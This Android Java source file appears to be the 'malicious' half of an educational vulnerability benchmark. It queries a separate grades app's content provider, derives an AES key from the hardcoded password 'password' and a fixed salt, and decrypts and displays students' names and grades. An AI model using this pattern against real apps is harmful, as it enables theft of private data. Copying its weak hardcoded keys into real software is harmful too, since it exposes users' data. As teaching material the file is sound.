package edu.ksu.cs.malicious;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.ArrayList;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    private static ArrayList<SecretKey> keys = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ArrayList<String> passwords = new ArrayList<>();
        passwords.add("password");
        keys = getKeys(passwords);
    }

    @Override
    protected void onResume() {
        super.onResume();
        final Button getStudentInfo = (Button) findViewById(R.id.get_stuInfo_btn);

        getStudentInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String result = "null,null";
                Cipher cipher = null;
                TextView name_view = (TextView) findViewById(R.id.orig_name);
                TextView grade_view = (TextView) findViewById(R.id.orig_grade);
                Uri.Builder uriBuilder = new Uri.Builder();
                uriBuilder.authority("edu.ksu.cs.benign.grades");
                uriBuilder.scheme("content");
                Cursor mCursor = getContentResolver().query(uriBuilder.build(), null, null, null, null, null);
                if (mCursor != null && mCursor.getCount() > 0) {
                    while (mCursor.moveToNext()) {
                        String entry = mCursor.getString(mCursor.getColumnIndex("stuInfo"));
                        String[] encrptedValues = entry.split("\\[");
                        if (encrptedValues.length == 2) {
                            Log.d(TAG, "IV = " + encrptedValues[0]);
                            Log.d(TAG, "data = " + encrptedValues[1]);
                            try {
                                cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
                            } catch (NoSuchPaddingException | NoSuchAlgorithmException e) {
                                Log.d(TAG, "Exception occurred while creating cipher instance");
                                throw new RuntimeException(e);
                            }
                            IvParameterSpec ivParameterSpec = new IvParameterSpec(Base64.decode(encrptedValues[0].getBytes(), Base64.DEFAULT));
                            try {
                                cipher.init(Cipher.DECRYPT_MODE, keys.get(0), ivParameterSpec);
                            } catch (InvalidAlgorithmParameterException | InvalidKeyException e) {
                                Log.d(TAG, "Exception while initializing cipher");
                                throw new RuntimeException(e);
                            }
                            try {
                                result = new String(cipher.doFinal(Base64.decode(encrptedValues[1].getBytes(), Base64.DEFAULT)), "UTF-8");
                            } catch (IllegalBlockSizeException | BadPaddingException | UnsupportedEncodingException e) {
                                Log.d(TAG, "Exception occurred while decrypting");
                            }
                            String[] name_grade = result.split(",");
                            name_view.setText(name_grade[0].trim());
                            grade_view.setText(name_grade[1].trim());
                        } else {
                            Log.d(TAG, "No values found");
                        }
                    }
                }
                if (mCursor != null) {
                    mCursor.close();
                }
            }
        });
    }

    private ArrayList<SecretKey> getKeys(ArrayList<String> passwords) {
        String salt = "90dujHU*";
        ArrayList<SecretKey> keys = new ArrayList<>();
        try {
            for (String password : passwords) {
                KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt.getBytes(), 1000, 256);
                SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
                byte[] keyBytes = secretKeyFactory.generateSecret(keySpec).getEncoded();
                SecretKey key = new SecretKeySpec(keyBytes, "AES");
                keys.add(key);
            }
            return keys;
        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
            e.printStackTrace();
            return null;
        }
    }
}
